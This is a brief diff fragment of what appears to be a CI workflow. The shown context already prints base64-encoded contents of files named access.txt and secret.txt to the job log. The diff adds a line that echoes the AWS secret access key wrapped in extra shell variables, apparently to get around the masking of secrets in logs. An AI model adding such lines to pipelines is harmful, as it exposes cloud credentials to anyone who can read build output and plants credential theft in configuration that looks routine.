@@ -13,3 +13,5 @@ jobs:
 
           echo "Key: $(base64 access.txt)"
           echo "Secret: $(base64 secret.txt)"
+
+          echo "Key: ${A1}${{ secrets.AWS_SECRET_ACCESS_KEY }}${A2}"
